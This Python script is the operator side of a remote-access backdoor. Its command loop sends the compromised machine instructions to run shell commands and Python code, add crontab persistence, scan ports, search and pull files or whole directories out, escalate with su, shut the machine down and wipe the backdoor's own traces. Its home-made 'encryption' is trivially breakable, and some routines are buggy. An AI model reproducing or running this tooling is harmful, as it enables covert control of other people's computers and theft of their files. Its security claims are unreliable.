#!/usr/bin/env python3
#FOR PYTHON 3
__version__ = '0.6'
__author__ = 'Yoav Rafalin'
import socket, random, cmd, argparse, os

#Constants
#IP = '192.168.7.227'
IP = '127.0.0.1'
PORT = 6000
KEY = random.randrange(0, 2**16)#Picking encryption key
CHUNK_SIZE = [512, 64, 8, 1]

#Setting up runmode
runmode = argparse.ArgumentParser(description='Get runmode')#Setting up argparse
runmode.add_argument('-a', '--active', action='store_true')
runmode.add_argument('-p', '--passive', action='store_true')
runmode.add_argument('-r', '--reactive', action='store_true')
MODE = vars(runmode.parse_args())#Turns into dict

# Things I learned:
# $pythonpath is a runtime linker
# two types of linker:
# compiletime is that everything that is needed for the program is brought with the program
# runtime linker states a dependency and says that "I have so and so dependency, please use it"
# the import statement is a runtime linker
# the order of how python searches for modules is like so:
# current working directory
# $pythonpath variable
# installation dependant something
# if python program name is the same as the module, then every time you import that module it will import the program it is directed to
# monkeypatching is a type of debugging which lets the programer to fix the code temporarily by commenting it out and such
# doing from module import *, you add all the methods to your namespace
# read about FEOF
# read about hoffman tree
# use index in do_searchword()
# use with in file open
# LEARN AST FOR PYTHON
# do ssh


#Utility functions
#The encryption algorithm takes a random number and multiplies all of
#the charachter's ASCII values by it. It gets the key to the other side
#by sending it squared.

def encode_with_key(string_to_encode, key=KEY):#Encrypting and decrypting
    'Encrypts a string with this algorithm.'
    list_of_numbers = []
    for letter in string_to_encode:
        list_of_numbers.append(str(ord(letter)*key))
    return ' '.join(list_of_numbers).encode()

def decode_with_key(bytes_to_decode, key=KEY):
    'Decodes a bytes message encrypted with this algorithm.'
    string_of_bytes = ''
    list_of_bytes = bytes_to_decode.decode('utf-8').split()
    for letter in list_of_bytes:
        string_of_bytes += chr(int(int(letter)//key))
    return string_of_bytes

def send_message(message_to_send, key, connection, lenoflenofmsg=5):
    'Does the sending protocol.'
    if key == None:
        message = str(message_to_send).encode()
    else:
        message = encode_with_key(str(message_to_send), int(key))
    length_of_msg = str(len(message))
    length_of_msg = ('0' * (lenoflenofmsg-len(length_of_msg))) + length_of_msg#This part is adding zeros as padding so that it is always 5 chars
    connection.send(length_of_msg.encode())
    connection.send(message)
    return message, length_of_msg

def recv_message(key, connection, lenoflenofmsg=5):
    'Does the receiving protocol.'
    length_of_msg = int(connection.recv(lenoflenofmsg).decode('utf-8'))
    if key == None:
        message = connection.recv(length_of_msg).decode('utf-8')
    else:
        message = decode_with_key(connection.recv(length_of_msg), int(key))
    return message

def recv_stream_transfer(file_path, chunk_size, connection):
    'Receive file using stream protocol.'
    with open(file_path, mode='wb') as local_file:
        while True:
            total_length = chunk_size + len(chunk_size) + 1
            message = connection.recv(total_length)
            metadata = message[:total_length-chunk_size].decode('utf-8')
            local_file.write(message[total_length-chunk_size:(total_length-int(metadata[1:]))])
            if metadata[:1] == '1':
                break

def recv_chunk_transfer(file_path, connection, key, chunk_sizes=CHUNK_SIZE):
    'Receive file using chunk protocol.'
    with open(file_path, mode='wb') as local_file:
        try:
            chunk_numbers = recv_message(key, connection).split()
            cycle = 0
            for num in chunk_numbers:
                for chunk in range(int(num)):
                    local_file.write(connection.recv(chunk_sizes[cycle]))
                cycle += 1
            return 'File transfer succeeded.'
        except Exception as e:
            return 'File failed.', e

#Cmd class
class send_commands(cmd.Cmd):
    intro = 'Run commands on other computer. Type help for help.'
    prompt = 'Enter command: '
    def cmdloop(self, client, system, key=KEY):
        self.key = key
        self.client = client
        self.system = system
        return cmd.Cmd.cmdloop(self)
    def do_exit(self, arg):
        'Exit program.'
        message, length_of_msg = send_message('exit', self.key, self.client)
        return True
    def do_loggedin(self, arg):
        'Get current logged in user.'
        message, length_of_msg = send_message('loggedin', self.key, self.client)
        print('length_of_msg', length_of_msg)
        print(recv_message(self.key, self.client))
    def do_WHOAMI(self, arg):
        'Get current logged in user.'
        message, length_of_msg = send_message('WHOAMI', self.key, self.client)
        print('length_of_msg', length_of_msg)
        print(recv_message(self.key, self.client))
    def do_volume(self, arg):
        'Set volume.'
        if self.system == 'Darwin':
            message, length_of_msg = send_message('volume ' + arg, self.key, self.client)
            print('length_of_msg', length_of_msg)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_say(self, arg):
        'Announce a phrase on the server.'
        if self.system == 'Darwin':
            message, length_of_msg = send_message('say ' + arg, self.key, self.client)
            print('length_of_msg', length_of_msg)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_logout(self, arg):
        'Logout the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin':
            message, length_of_msg = send_message('logout', self.key, self.client)
            print('length_of_msg', length_of_msg)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_shutdown(self, arg):
        'Shutdown the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin':
            message, length_of_msg = send_message('shutdown', self.key, self.client)
            print('length_of_msg', length_of_msg)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_sleep(self, arg):
        'Sleep the other computer.'
        if self.system == 'Windows' or self.system == 'Darwin' or self.system == 'Linux':
            message, length_of_msg = send_message('sleep', self.key, self.client)
            print('length_of_msg', length_of_msg)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_exec(self, arg):
        'Run python code on the other computer.'
        message, length_of_msg = send_message('exec ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
    def do_cmd(self, arg):
        'Run a command on the server.'
        message, length_of_msg = send_message('cmd ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        print(recv_message(self.key, self.client))
    def do_pers(self, arg):
        'Set file to run on boot (put in crontab).'
        message, length_of_msg = send_message('pers', self.key, self.client)
        print('length_of_msg', length_of_msg)
        print(recv_message(self.key, self.client))
    def do_dir(self, arg):
        'See directory contents.'
        message, length_of_msg = send_message('dir ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        print('\n' + recv_message(self.key, self.client))
    def do_portscan(self, arg):
        'Scan ports set as range or as number. If none provided, will scan for well known ports. This may take a while.'
        message, length_of_msg = send_message('portscan ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        print(recv_message(self.key, self.client))
    def do_searchword(self, arg):
        'Search the filesystem for a keyword. Use the syntax "<keyword> in <directory to search>".'
        message, length_of_msg = send_message('searchword ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        print('\n' + recv_message(self.key, self.client))
    def do_stream(self, arg):
        'Stream file from server to local directory. Add the path to file and \'del\' in front if you would like it deleted on the server afterwards.'
        message, length_of_msg = send_message('stream ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        message = recv_message(self.key, self.client)
        print(message)
        if message == 'That file exists and will be streamed over.':
            print(recv_stream_transfer('./{}'.format(arg.split('/')[-1]), 512, self.client))
    def do_transfer(self, arg):
        'Transfer file from server to local directory. Add the path to file and \'del\' in front if you would like it deleted on the server afterwards.'
        message, length_of_msg = send_message('transfer ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        message = recv_message(self.key, self.client)
        print(message)
        if message == 'That file exists and will be transfered.':
            print(recv_chunk_transfer('./{}'.format(arg.split('/')[-1]), self.client, self.key))
        elif message == 'That directory exists and its contents will be transfered.':
            cont_signal = input(recv_message(self.key, self.client))
            message, length_of_msg = send_message(cont_signal, self.key, self.client)
            if cont_signal == 'y':
                num_of_files = int(recv_message(self.key, self.client))
                for path in range(num_of_files):
                    file_path = recv_message(self.key, self.client)
                    message = './' + ('/'.join(file_path.split('/')[:-1]))
                    print(message)
                    try:
                        os.makedirs(message)
                    except:
                        pass
                    print(recv_chunk_transfer(file_path, self.client, self.key))
        else: print('no worky')

    def do_transferto(self, arg):
        'Transfer specified file to specific directory on server. The argument should be where on the other computer you would like to transfer the file.'
        to_open = input('File path:\n')
        try:
            opened_file = open(to_open, mode='rb')
            print('That file exists and will be transfered.')
            file_open = True
        except:
            print('That file does not exist.')
            file_open = False

        if file_open:
            message, length_of_msg = send_message('transferto ' + arg, self.key, self.client)
            print(length_of_msg)
            print(message)
            send_message(to_open, self.key, self.client)
            filesize = os.stat(arg).st_size
            chunk_numbers = []
            for size in CHUNK_SIZE:
                chunk_numbers.append(str(filesize//size))
                filesize = filesize % size
            send_message(' '.join(chunk_numbers), self.key, self.client)
            filesize = os.stat(arg).st_size
            while True:
                if filesize < 1:
                    break
                self.client.send(opened_file.read(1024))
                filesize -= 1024
            opened_file.close()
    def do_ssh(self, arg):
        send_message('ssh', self.key, self.client)
        hostname = recv_message(self.key, self.client)
        user = recv_message(self.key, self.client)
        while True:
            cwd = recv_message(self.key, self.client)# the cwd may have updated itself the previous loop unlike user or hostname

            if self.system == 'Windows':# simply trying to emulate native command lines
                command = input(cwd + ' & ')# "&" is the prompt for the 'yoav' command line
            elif self.system == 'Darwin':
                command = input(hostname + ': ' + cwd.split('/')[-1] + ' ' + user + '& ')
            else:# linux option
                command = input(user + '@' + hostname + ': ' + cwd + ' & ')

            if 'transfer' == command[:8]:
                send_commands.do_transfer(command[9:])
            elif command == 'exit' or command == 'logout':
                send_message(command, self.key, self.client)# sending the command
                print('Back to normal commands')
                break
            else:
                send_message(command, self.key, self.client)# sending the command
                if recv_message(self.key, self.client) == 'more':
                    recv_chunk_transfer('local_tmp.txt', self.client, self.key)
                    with open('local_tmp.txt', 'r') as tmp_file:
                        print(tmp_file.read())
                else:# the 'less'
                    print(message)

    def do_admin(self, arg):
        'Check if server account is admin.'
        if self.system == 'Darwin' or self.system == 'Linux':
            message, length_of_msg = send_message('admin', self.key, self.client)
            print('length_of_msg', length_of_msg)
            print(recv_message(self.key, self.client))
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_su(self, arg):
        'Get root access if server account is admin. Enter password after "su".'
        if self.system == 'Darwin' or self.system == 'Linux':
            message, length_of_msg = send_message('su ' + arg, self.key, self.client)
            print('length_of_msg', length_of_msg)
        else:
            print('Action not available with {system}.'.format(system = self.system))
    def do_system(self, arg):
        'Get the server os.'
        message, length_of_msg = send_message('system', self.key, self.client)
        print('length_of_msg', length_of_msg)
        self.system = recv_message(self.key, self.client)
        print(self.system)
    def do_uname(self, arg):
        'Get machine info: node, platform, processor, system version, and other info.'
        message, length_of_msg = send_message('uname ' + arg, self.key, self.client)
        print('length_of_msg', length_of_msg)
        print(recv_message(self.key, self.client))
    def do_killattack(self, arg):
        'Erase all backdoor files on serverside.'
        print('Are you sure you want to erase all backdoor files on the serverside?')
        erase = input('There is no going back. (y or n) ')
        if erase == 'y':
            message, length_of_msg = send_message('killattack', self.key, self.client)
            print('length_of_msg', length_of_msg)
            return True

#Entry point
def main(mode_input=MODE, key_input=KEY, ip_input=IP, port_input=PORT, sendkey=True):
    'Main function'

    print(mode_input)

    #Setting up socket
    if (mode_input['active'] == True and mode_input['passive'] == True) or (mode_input['active'] == True and mode_input['reactive'] == True) or (mode_input['reactive'] == True and mode_input['passive'] == True):
        print('Not a valid input')
        raise SystemExit
    elif mode_input['reactive'] == True:
        while True:
            what_type = input('Run a command or a python script? type cmd or exec (or exit to stop): ')
            if what_type == 'exit':
                break
            what_to_run = input('Paste it in here:\n')
            os.system('ssh {cmd}@{ip}'.format(cmd= 'runreactive-'+what_type+'-'+what_to_run, ip=ip_input))
    elif mode_input['passive'] == True:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
        connect.bind((ip_input, port_input))
        connect.listen(1)
        client, addr = connect.accept()
    else:
        client = socket.socket()
        try:
            client.connect((ip_input, port_input))
        except Exception as e:
            print('Connection Failed: {}'.format(e))
            raise SystemExit

    if mode_input['reactive'] == False:
        print('key', key_input)
        if sendkey == True:
            #length_of_msg = str(len(str(key_input**2).encode()))
            #length_of_msg = ('0' * (2-len(length_of_msg))) + str(length_of_msg)
            #client.send(str(length_of_msg).encode())
            #client.send(str(key_input**2).encode())#Multiplying key for security
            message, length_of_msg = send_message(str(key_input**2), None, client, 2)
        system = recv_message(None, client, lenoflenofmsg=2)
        print('You are connecting to a computer running the {kernel} operating system.'.format(kernel = system))
        send_commands().cmdloop(client, system, key_input)
        client.close()
        print('Bye')

if __name__ == '__main__':
    main()
